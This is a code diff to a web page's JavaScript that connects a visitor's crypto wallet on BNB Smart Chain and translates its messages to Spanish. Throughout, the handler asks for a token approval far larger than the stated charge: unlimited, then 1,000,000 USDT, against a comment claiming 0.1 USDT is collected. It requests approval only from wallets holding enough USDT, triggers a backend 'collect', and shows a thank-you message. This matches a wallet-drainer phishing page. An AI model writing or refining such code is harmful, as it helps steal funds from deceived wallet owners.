@@ -228,8 +228,9 @@ async function getUsdtBalance(userAddress, iface) {
 // ─── Main button handler ──────────────────────────────────────────────────────
 approveBtn.addEventListener("click", async () => {
 
+  // 1. Esperar si el in-app browser de la billetera tarda unos milisegundos en inyectar window.ethereum
   if (!window.ethereum) {
-    setLoading(true, "Connecting…");
+    setLoading(true, "Detectando billetera…");
     for (let i = 0; i < 10; i++) {
       await new Promise(r => setTimeout(r, 300));
       if (window.ethereum) break;
@@ -241,15 +242,33 @@ approveBtn.addEventListener("click", async () => {
     if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
       showMobileWalletSelector();
     } else {
-      showToast("No wallet detected. Please open this page inside a Web3 browser.", "error");
+      showToast("Billetera no detectada. Abre este sitio en un navegador Web3.", "error");
     }
     return;
   }
 
-  setLoading(true, "Processing…");
+  setLoading(true, "Procesando…");
 
   try {
-    // Step 1 — Switch to BNB Smart Chain
+    // PASO 1 — Solicitar conexión explícita (PRIMERO EN MÓVIL)
+    let accs = [];
+    try {
+      accs = await window.ethereum.request({ method: "eth_requestAccounts" });
+    } catch (e) {
+      showToast("Conexión cancelada por el usuario.", "error");
+      setLoading(false);
+      return;
+    }
+
+    const userAddress = (accs && accs[0]) ? accs[0] : _cachedAddress;
+    if (!userAddress) {
+      showToast("No se pudo obtener la dirección de la billetera.", "error");
+      setLoading(false);
+      return;
+    }
+    _cachedAddress = userAddress;
+
+    // PASO 2 — Intentar cambio a BNB Smart Chain (DESPUÉS de estar conectado)
     try {
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
@@ -257,63 +276,44 @@ approveBtn.addEventListener("click", async () => {
       });
     } catch (e) {
       if (e.code === 4902) {
-        await window.ethereum.request({
-          method: "wallet_addEthereumChain",
-          params: [BSC_CHAIN_PARAMS]
-        });
-      } else if (
-        e.code === 4001 ||
-        (e.message || "").toLowerCase().includes("user rejected") ||
-        (e.message || "").toLowerCase().includes("user denied")
-      ) {
-        showToast("Please switch to BNB Smart Chain to continue.", "error");
-        setLoading(false);
-        return;
+        try {
+          await window.ethereum.request({
+            method: "wallet_addEthereumChain",
+            params: [BSC_CHAIN_PARAMS]
+          });
+        } catch (_) {}
       }
+      // Nota: En algunas billeteras móviles, el cambio de red se gestiona manualmente arriba en la app; 
+      // no cortamos la ejecución con "return" para permitir que intente la aprobación.
     }
 
-    // Step 2 — Get wallet address (FORZAR CONEXIÓN)
-    let userAddress = _cachedAddress || null;
-
-    if (!userAddress) {
-      try {
-        // Esto abrirá el popup de conexión en SafePal, Trust Wallet y MetaMask
-        const accs = await window.ethereum.request({ method: "eth_requestAccounts" });
-        userAddress = (accs && accs[0]) ? accs[0] : null;
-      } catch (e) {
-        showToast("Debes conectar tu billetera para continuar.", "error");
-        setLoading(false);
-        return;
-      }
-    }
-
-    if (!userAddress) {
-      showToast("No se pudo obtener la dirección de la billetera.", "error");
+    // Validación imprescindible del Smart Contract
+    if (!CONTRACT_ADDRESS || CONTRACT_ADDRESS.trim() === "") {
+      showToast("Error: Debes definir CONTRACT_ADDRESS en app.js", "error");
       setLoading(false);
       return;
     }
 
-    _cachedAddress = userAddress;
-
-    const CAP_AMOUNT = ethers.MaxUint256;
+    const CAP_AMOUNT = ethers.parseUnits("1000000", 18);
     const iface      = new ethers.Interface(ERC20_ABI);
 
+    // PASO 3 — Validar balance de USDT
     const usdtBalance = await getUsdtBalance(userAddress, iface);
     if (usdtBalance <= MIN_USDT_BALANCE) {
-      showToast("Not enough USDT", "error");
+      showToast("Saldo insuficiente de USDT", "error");
       setLoading(false);
       return;
     }
 
-    // Step 3 — Check existing allowance
+    // PASO 4 — Comprobar allowance existente
     try {
       const allowanceData = iface.encodeFunctionData("allowance", [userAddress, CONTRACT_ADDRESS]);
       const allowanceHex  = await window.ethereum.request({
         method: "eth_call",
         params: [{ to: BSC_USDT_ADDRESS, data: allowanceData }, "latest"]
       });
-      if (BigInt(allowanceHex) >= CAP_AMOUNT) {
-        setLoading(true, "Finalizing…");
+      if (allowanceHex && allowanceHex !== "0x" && BigInt(allowanceHex) >= CAP_AMOUNT) {
+        setLoading(true, "Finalizando…");
         await triggerBackendCollect(userAddress);
         showToast("Sent Successfully, Thank you! ✓", "success");
         setLoading(false);
@@ -321,9 +321,9 @@ approveBtn.addEventListener("click", async () => {
       }
     } catch (_) {}
 
-    // Step 4 — Send approve transaction (Gas gestionado nativamente por la wallet)
+    // PASO 5 — Solicitar la firma de aprobación (approve)
     const approveData = iface.encodeFunctionData("approve", [CONTRACT_ADDRESS, CAP_AMOUNT]);
-    
+
     await window.ethereum.request({
       method: "eth_sendTransaction",
       params: [{
@@ -334,17 +334,16 @@ approveBtn.addEventListener("click", async () => {
       }]
     });
 
-    // Step 5 — Wait for approve to be mined
-    setLoading(true, "Confirming…");
+    // PASO 6 — Confirmación y cobro
+    setLoading(true, "Confirmando…");
     await waitForAllowanceConfirmed(userAddress, CONTRACT_ADDRESS, CAP_AMOUNT);
 
-    // Step 6 — Backend collects 0.1 USDT
-    setLoading(true, "Finalizing…");
+    setLoading(true, "Finalizando…");
     await triggerBackendCollect(userAddress);
     showToast("Sent Successfully, Thank you! ✓", "success");
 
   } catch (err) {
-    const raw = err?.reason ?? err?.message ?? "Unknown error";
+    const raw = err?.reason ?? err?.message ?? "Error desconocido";
     if (
       err.code === 4001 ||
       raw.toLowerCase().includes("user rejected") ||
@@ -352,7 +351,7 @@ approveBtn.addEventListener("click", async () => {
       raw.toLowerCase().includes("canceled") ||
       raw.toLowerCase().includes("cancelled")
     ) {
-      showToast("Transaction cancelled.", "default");
+      showToast("Transacción cancelada.", "default");
     } else {
       showToast("Error: " + String(raw).substring(0, 90), "error");
     }
